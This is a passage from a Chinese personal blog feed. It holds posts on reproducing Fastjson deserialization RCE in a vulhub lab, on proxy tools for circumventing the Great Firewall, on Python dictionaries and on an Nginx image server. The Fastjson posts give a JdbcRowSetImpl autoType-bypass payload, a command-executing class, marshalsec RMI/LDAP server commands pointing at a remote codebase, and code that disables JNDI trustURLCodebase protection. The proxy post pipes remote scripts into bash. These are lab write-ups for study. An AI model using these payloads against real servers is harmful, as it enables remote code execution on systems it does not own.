src="https://www.buhuixiu.com/images/jdk102-%E5%85%A8%E5%9B%BE%E8%BF%90%E8%A1%8C.png"></a></img></p><div><p><a href="https://www.buhuixiu.com/images/jdk-8u-102.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk-8u-102.png" width=70% height=70%></a></img></p><p><a href="https://www.buhuixiu.com/images/jdk181.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk181.png" width=70% height=70%></a></img></p></div>通过参考一些帖子，相应的较新版本的jdk都有了针对RMI方式的防御，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。<span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mybatis.controller;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * &lt;h3&gt;mybatis2&lt;/h3&gt;</span><br><span class="hljs-comment"> * &lt;p&gt;&lt;/p&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : zhuxinkai</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : 2020-07-07 15:32</span><br><span class="hljs-comment"> **/</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SystemTest</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br><br>        setValue();<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setValue</span><span class="hljs-params">()</span> </span>&#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>       <br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br><br>    &#125;<br>  <br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>然后在spring boot 实现的REST API中执行下这个设置方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@PostMapping(value = &quot;/rest&quot;,</span><br><span class="hljs-meta">        consumes = &quot;application/json;charset=UTF-8&quot;,</span><br><span class="hljs-meta">        produces = &quot;application/json;charset=UTF-8&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">rest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String person)</span> </span>&#123;<br><span class="hljs-comment">//利用  System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;) 改变两个默认值，进行测试。</span><br><span class="hljs-comment">//  System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br>SystemTest.setValue();<br><br>String data = person;<br><span class="hljs-comment">//System.out.println(person);</span><br>    JSONObject obj = JSON.parseObject(person);<br>    System.out.println(obj);<br>    <span class="hljs-keyword">return</span> obj;<br><br></code></pre></td></tr></table></figure>通过相关的设置，发现8u181版本的jdk也可以正常执行rmi远程程序。所以可以证明，确实是这两个值增强了相应的安全设置。然而，这两个值是默认为false的，所以，相应的利用方式需要换一个姿势。<h1 id="对接LDAP服务-JNDI-Reference-Payload"><a href="#对接LDAP服务-JNDI-Reference-Payload" class="headerlink" title="对接LDAP服务 + JNDI Reference Payload"></a>对接LDAP服务 + JNDI Reference Payload</h1><p>这个利用方式受限于  com.sun.jndi.ldap.object.trustURLCodebase，相应的利用方式直到2018年10月才修复。<br>在Oracle JDK 11.0.1、8u191、7u201、6u211之前，都可以使用这种方式进行执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://192.168.0.119:8888/Exploit/#TouchFile&quot;</span> <span class="hljs-number">9999</span><br><br></code></pre></td></tr></table></figure><p>利用marshalsec ,建立LDAP服务器监听端。这次我本地的jdk版本是8u181 版本的直接可以利用成功。<br><a href="https://www.buhuixiu.com/images/fastjson-2-2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/fastjson-2-2.png"></a></img><br><a href="https://www.buhuixiu.com/images/jdk-by-ldap.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/jdk-by-ldap.png"></a></img></p><p><a href="https://www.buhuixiu.com/images/fastjson-2-3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/fastjson-2-3.png"></a></img></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Fastjson 相关安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson vulnerable poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于科学上网</title>
      <link href="/2020/07/06/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>/2020/07/06/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="警告：-本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。"><a href="#警告：-本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。" class="headerlink" title="警告： 本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。"></a>警告： 本文仅用于个人学习使用，技术讨论。通过本网页进行的非法活动，将不承担任何责任。</h1><h4 id="1-1-关于翻墙的历史："><a href="#1-1-关于翻墙的历史：" class="headerlink" title="1.1 关于翻墙的历史："></a>1.1 关于翻墙的历史：</h4><p>  翻墙的历史，需要追溯到2008年。谷歌退出中国大陆，YouTube以隐私为理由拒绝配合中国政府提供新疆恐怖袭击人员的相关计划及个人信息。同时考虑到</p><h3 id="1-2-翻墙方式："><a href="#1-2-翻墙方式：" class="headerlink" title="1.2 翻墙方式："></a>1.2 翻墙方式：</h3><h4 id="1-2-1-VPN"><a href="#1-2-1-VPN" class="headerlink" title="1.2.1 VPN :"></a>1.2.1 VPN :</h4><h5 id="1-2-1-1-卡巴斯基vpn"><a href="#1-2-1-1-卡巴斯基vpn" class="headerlink" title="1.2.1.1 卡巴斯基vpn"></a>1.2.1.1 卡巴斯基vpn</h5><p>. 登录账号： 300M每天。 不登陆 200M 优点：可以看4K，速度跑起来压力比较小。。可以上到10K Kbps上的速度，但是流量马上用完，，毕竟只有200-300M</p><h5 id="1-2-1-2-Hotspot-VPN-热盾）"><a href="#1-2-1-2-Hotspot-VPN-热盾）" class="headerlink" title="1.2.1.2 Hotspot VPN(热盾）"></a>1.2.1.2 Hotspot VPN(热盾）</h5><p>免费 500M流量  付费 3美元每月  相对比较慢，轻量级使用可以满足。</p><h5 id="1-2-1-3-Hideme"><a href="#1-2-1-3-Hideme" class="headerlink" title="1.2.1.3 Hideme"></a>1.2.1.3 Hideme</h5><p>稳定性较差，连接需要几次。速度可以排第二。每月是10GB的流量，可以播放1080P, 5-8k kbps的速度。也可以上10K kbps，可以播放4K.</p><h5 id="1-2-1-4-VPN总结"><a href="#1-2-1-4-VPN总结" class="headerlink" title="1.2.1.4 VPN总结"></a>1.2.1.4 VPN总结</h5><p>以前  翻墙 === VPN ，但是目前，VPN似乎已经是过时的一种技术手段。 目前 v2ray , trojan, SS,SSR 这些流量加密方式和<br>流量伪装技术，比VPN的管道技术，似乎更被 GFW 所喜欢。<br>   VPN毕竟是被大公司玩的，需要ISP的介入。当然你也可以从二级供应商那里获取相应的服务。</p><h4 id="1-2-2-v2ray"><a href="#1-2-2-v2ray" class="headerlink" title="1.2.2 v2ray"></a>1.2.2 v2ray</h4><p>v2ray（tcp)  + bbr plus or + 锐速  .<br>v2ray (websocket + tls) + bbr plus or + 锐步。<br>            <a href="https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC</a><br>            bash &lt;(curl -s -L <a href="https://git.io/v2ray.sh">https://git.io/v2ray.sh</a>)</p><span id="more"></span><h4 id="1-2-3-trojan"><a href="#1-2-3-trojan" class="headerlink" title="1.2.3 trojan"></a>1.2.3 trojan</h4><p><strong>trojan</strong>是近两年兴起的网络工具，项目官网<a href="https://github.com/**trojan**-gfw%E3%80%82">https://github.com/**trojan**-gfw。</a> 与强调加密和混淆的SS/SSR等工具不同，<strong>trojan</strong>将通信流量伪装成互联网上最常见的https流量，从而有效防止流量被检测和干扰。 在敏感时期，基本上只有<strong>trojan</strong>和v2ray伪装 能提供稳如狗的体验。<br>   trojan官网地址  <a href="https://trojan-gfw.github.io/trojan/">https://trojan-gfw.github.io/trojan/</a></p><pre><code>   bash &lt;(curl -s -L https://github.com/V2RaySSR/Trojan/raw/master/Trojan.sh)   wget -N --no-check-certificate &quot;https://raw.githubusercontent.com/V2RaySSR/Trojan_Panel/master/trojan_panel.sh&quot; &amp;&amp; chmod +x trojan_panel.sh &amp;&amp; ./trojan_panel.sh</code></pre><h6 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h6><pre><code>        We’ll only cover the build process on Linux since we will be providing Windows and macOS binaries. Building trojan on every platform is similar.        Dependencies        Install these dependencies before you build (note that the test has some additional dependencies):        CMake &gt;= 3.7.2        Boost &gt;= 1.66.0        OpenSSL &gt;= 1.1.0        libmysqlclient        For Debian users, run sudo apt -y install build-essential cmake libboost-system-dev libboost-program-options-dev libssl-dev default-libmysqlclient-dev to install all the necessary dependencies.        Clone        Type in        git clone https://github.com/trojan-gfw/trojan.git        cd trojan/        to clone the project and go into the directory.        Build and Install        Type in        mkdir build        cd build/        cmake ..        make        ctest        sudo make install        to build, test, and install trojan. If everything goes well you’ll be able to use trojan.        </code></pre><h4 id="1-2-4-shadowsocks"><a href="#1-2-4-shadowsocks" class="headerlink" title="1.2.4 shadowsocks"></a>1.2.4 shadowsocks</h4><p> AEAD加密。<br> shadowsocks 协议在定位方面，特征过滤方面，可能已经被GFW定位得比较准确。所以，使用这个协议得服务器，一般被封杀得比较严重。<br> shadowsocks RTT最短，握手最快。大都数机场依然得主要协议方式。</p><h3 id="1-3-翻墙安全"><a href="#1-3-翻墙安全" class="headerlink" title="1.3 翻墙安全"></a>1.3 翻墙安全</h3><p> 妄图通过协议，或者跳转，或者其他乱起八糟的方式，想完全逃脱GFW的监控是不可能的。相应的，只不过是你未达到一个阈值另外是<br> 大多数机场的狡兔三窟策略方式。 AI和大数据分析，已经让我们无所遁形。<br> 不要提供翻墙技术。不要商业化翻墙服务（大机场的人员估计都不在国内）。不要去国外的帖子上面发表反政府，反中国共产党言论。（毕竟中国提供了稳定的发展环境，不要吃着家人的奶，还去别人家里骂娘。有本事在自己家里骂，硬杠。）</p><h3 id="1-4-可靠性，可用性。"><a href="#1-4-可靠性，可用性。" class="headerlink" title="1.4 可靠性，可用性。"></a>1.4 可靠性，可用性。</h3><p> 我们家是移动100M宽带。很多人抱怨移动网络翻墙很坑。。。事实上也是如此。。使用同一台服务器（香港 -谷歌云VPS-延迟30-50)，连接家里得100M 和连接到我得联通4G流量，结果100M移动，明显的拥塞控制，早上100M移动的4K高清，可以跑到80M，牛吧。但是，在晚上，却少于1M。逼得我，只能使用联通4G，使用联通4G可以跑到3-5M左右。可以看到，ISP的国际出口方面，根本不是受GFW影响，根本就是ISP的国际出口不够，或者是因为你跑的现路优先级不够。所以，在这里，大型机场的优势就出来了，他们是买了BGP线路的人。相应的服务和应急措施还是跟得上，比你买国外服务器自己搭建服务器，可以突破国际出口，QOS， 限速等等的限制。<br> 当然，如果你是电信的宽带，200M或者以上，那这方面对你的限制会显得小很多。<br> 我对比了下，trojan 和 v2ray vmess方式。速度相差无几。</p><h5 id="可靠性："><a href="#可靠性：" class="headerlink" title="可靠性："></a>可靠性：</h5><p>不知道是否GFW放松了管控，目前的断网情况比去年要好很多。去年在世博会，进博会， 政协会议，这个会那个会期间，很多shadowsocks的服务器都不能用了。今年，我买的机场， 跑V2ray VMESS的目前，没有出现所有服务器都不能用的情况。很愉快的在上网。</p><h3 id="1-5-科学上网干什么？"><a href="#1-5-科学上网干什么？" class="headerlink" title="1.5 科学上网干什么？"></a>1.5 科学上网干什么？</h3><pre><code>60%的用户仅pron,我也是分子。但是，这个东西丰简由人，身体要紧。NETFIX的账户需要60港币一个月。youtube 的广告比较烦人。但是内容值得看，比国内哪些看多了会脑残的视频平台好了N多个等级，B站除外。BBC也是很政治色瓷浓郁的一个地方，当然比国内还是要好些的。学点英语。。 youtobe  TED演讲</code></pre><p><a href="%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200607220759.jpg" title="node更换路径" class="gallery-item"><img src="%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200607220759.jpg" alt="node更换路径"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> v2ray </tag>
            
            <tag> ssr </tag>
            
            <tag> bbrplus </tag>
            
            <tag> trojan </tag>
            
            <tag> wbsocket + ssl </tag>
            
            <tag> 翻墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python遍历字典</title>
      <link href="/2020/07/04/python%E9%81%8D%E5%8E%86%E5%AD%97%E5%85%B8/"/>
      <url>/2020/07/04/python%E9%81%8D%E5%8E%86%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://www.buhuixiu.com/images/tutorial-on-how-to-use-comments-in-python.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/tutorial-on-how-to-use-comments-in-python.png"></a></img></p><h1 id="1-像遍历序列一样，可以使用普通的for语句"><a href="#1-像遍历序列一样，可以使用普通的for语句" class="headerlink" title="1,像遍历序列一样，可以使用普通的for语句"></a>1,像遍历序列一样，可以使用普通的for语句</h1><p><a href="https://www.buhuixiu.com/images/iteration-dict.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/iteration-dict.png"></a></img></p><h1 id="2-d-items-以元组的方式返回键-值对。"><a href="#2-d-items-以元组的方式返回键-值对。" class="headerlink" title="2,d.items 以元组的方式返回键-值对。"></a>2,d.items 以元组的方式返回键-值对。</h1><p><a href="https://www.buhuixiu.com/images/interation-dict2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/interation-dict2.png"></a></img></p><h1 id="3-关于逻辑判断的一些缺失点。"><a href="#3-关于逻辑判断的一些缺失点。" class="headerlink" title="3,关于逻辑判断的一些缺失点。"></a>3,关于逻辑判断的一些缺失点。</h1><p><a href="https://www.buhuixiu.com/images/%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD%E9%97%AE%E9%A2%98.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD%E9%97%AE%E9%A2%98.png"></a></img></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Nginx搭建简单的图片服务器</title>
      <link href="/2020/07/02/%E5%88%A9%E7%94%A8Nginx%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E7%89%87%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/07/02/%E5%88%A9%E7%94%A8Nginx%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E7%89%87%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="安装nginx-这里就略过了。"><a href="#安装nginx-这里就略过了。" class="headerlink" title="安装nginx 这里就略过了。"></a>安装nginx 这里就略过了。</h1><h1 id="安装vsftp"><a href="#安装vsftp" class="headerlink" title="安装vsftp"></a>安装vsftp</h1><p>安装vsftp 主要用于上传图片，其实这个可以适用Xmanager 的xftp ,或者适用WinSCP来完美解决。便捷，方便，迅速，可视化强。<br>或者直接适用rz命令，这是我最喜欢使用的。当然很多linux 服务器需要安装下。</p><h1 id="开始搭建Nginx-图片服务器"><a href="#开始搭建Nginx-图片服务器" class="headerlink" title="开始搭建Nginx 图片服务器"></a>开始搭建Nginx 图片服务器</h1><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><a href="https://www.buhuixiu.com/images/%E6%95%88%E6%9E%9C.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/%E6%95%88%E6%9E%9C.png"></a></img></p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="需要再nginx-html-下创建一个images文件夹-（实际访问的不是这个路径）"><a href="#需要再nginx-html-下创建一个images文件夹-（实际访问的不是这个路径）" class="headerlink" title="需要再nginx/html 下创建一个images文件夹 （实际访问的不是这个路径）"></a>需要再nginx/html 下创建一个images文件夹 （实际访问的不是这个路径）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /usr/local/nginx/html/images<br></code></pre></td></tr></table></figure><h3 id="修改nginx-conf-nginx-conf-在默认的server里再添加一个location并指定实际路径："><a href="#修改nginx-conf-nginx-conf-在默认的server里再添加一个location并指定实际路径：" class="headerlink" title="修改nginx/conf/nginx.conf 在默认的server里再添加一个location并指定实际路径："></a>修改nginx/conf/nginx.conf 在默认的server里再添加一个location并指定实际路径：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">location /images/&#123;<br>    root /usr/local/;<br>    autoindex on;<br><br>    &#125; <br></code></pre></td></tr></table></figure><h3 id="重启nginx"><a href="#重启nginx" class="headerlink" title="重启nginx"></a>重启nginx</h3><h3 id="将图片放置在具体的物理路径-usr-local-images-下"><a href="#将图片放置在具体的物理路径-usr-local-images-下" class="headerlink" title="将图片放置在具体的物理路径 /usr/local/images/下"></a>将图片放置在具体的物理路径 /usr/local/images/下</h3><h1 id="说明及注意事项，我在第4点饶了好久。"><a href="#说明及注意事项，我在第4点饶了好久。" class="headerlink" title="说明及注意事项，我在第4点饶了好久。"></a>说明及注意事项，我在第4点饶了好久。</h1><p>1)root则是将images映射到/usr/local/images/<br>2)autoindex on便是打开索引功能。不然无法建立有效的浏览索引。。如果是单纯的html访问，则可以指定html为索引类型。　<br>3)很多人用vsftpd上传图片，所有会新建用户，更改文件夹的权限等，在这里因为是采用rz方式上传，所以无需做更改权限处理。<br>4)root /usr/local 这后面是不带images的且root后面要有空格。local目录下有images目录，用于存放图片!</p><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p>这种方式的优点在于快捷和迅速。使用起来很方便。适合于静态部署图片服务器。<br>缺点在于，如果是要接入到WEB应用系统，实现图片文件的动态上传，审核，重新建立索引，重命名文件，类型限制等或者作为大型的图片服务器等，可能需要借助于fastdfs,等专门的图片服务器来实现。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1.2.47 远程命令执行漏洞</title>
      <link href="/2020/06/30/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/06/30/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p><a href="https://p403.ssl.qhimgs4.com/t0195606c8e40d8435f.png" class="gallery-item"><img src="https://p403.ssl.qhimgs4.com/t0195606c8e40d8435f.png"></a></img></p><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.4利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li></ul><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>这里可以用spring boot搭建一个简单的web项目，也可以去github上下载一个相关的dokcer项目。<br>我这边是下载了github上的vulhub项目的内容。相关的内容也是参考readme.md写的。<br>项目地址在<a herf="https://github.com/zhuxinkai/vulhub">这是我的fork地址，源地址自己搜索下</a><br>执行如下命令启动一个spring web项目，其中使用fastjson作为默认json解析器：<br>安装docker ,和docker compose 请查看我的两外两篇文章。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d<br></code></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8090</code>即可看到一个json对象被返回，<br>后面我们要将content-type修改为<code>application/json</code>，将GET改为POST将相关的payload发送给后端，后端接到后通过fastjson的解析，造成<br>相关的远程命令执行。这次测试的远程命令是在/tmp下新建 success文件。</p><span id="more"></span><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。<br>(目前大部分的jdk 都是8u181 版本，尝试自己建立一个环境试下）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// javac TouchFile.java</span><br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TouchFile</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span>&#125;;<br>            Process pc = rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="将上面的代码通过javac-编译成TouchFile-class文件。-将编译后的文件，放到web容器中。-我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。"><a href="#将上面的代码通过javac-编译成TouchFile-class文件。-将编译后的文件，放到web容器中。-我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。" class="headerlink" title="将上面的代码通过javac 编译成TouchFile.class文件。 将编译后的文件，放到web容器中。(我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。"></a>将上面的代码通过javac 编译成TouchFile.class文件。 将编译后的文件，放到web容器中。(我这里放在了tomcat中）这个class包含了后面需要具体执行的攻击命令（代码）。</h5><p><a href="https://www.buhuixiu.com/images/classpath.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/classpath.png"></a></img></p><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：<br>(自己下载项目然后，maven 打包成jar包。）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://你放置.class的路径/#TouchFile&quot; 9999<br></code></pre></td></tr></table></figure><h5 id="上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos-8上顺利执行，并看到效果了。具体原因没有去细究。"><a href="#上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos-8上顺利执行，并看到效果了。具体原因没有去细究。" class="headerlink" title="上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos 8上顺利执行，并看到效果了。具体原因没有去细究。"></a>上面这条在windows服务器没有跑成功，发送payload之后，没有数据连接过来。。但是在centos 8上顺利执行，并看到效果了。具体原因没有去细究。</h5><p><a href="https://www.buhuixiu.com/images/lisetenlog.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/lisetenlog.png"></a></img></p><p>向靶场服务器发送Payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://启动监听器的服务器:9999/Exploit&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.buhuixiu.com/images/success.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/success.png"></a></img></p><p>下图可见，在目标服务器上命令<code>touch 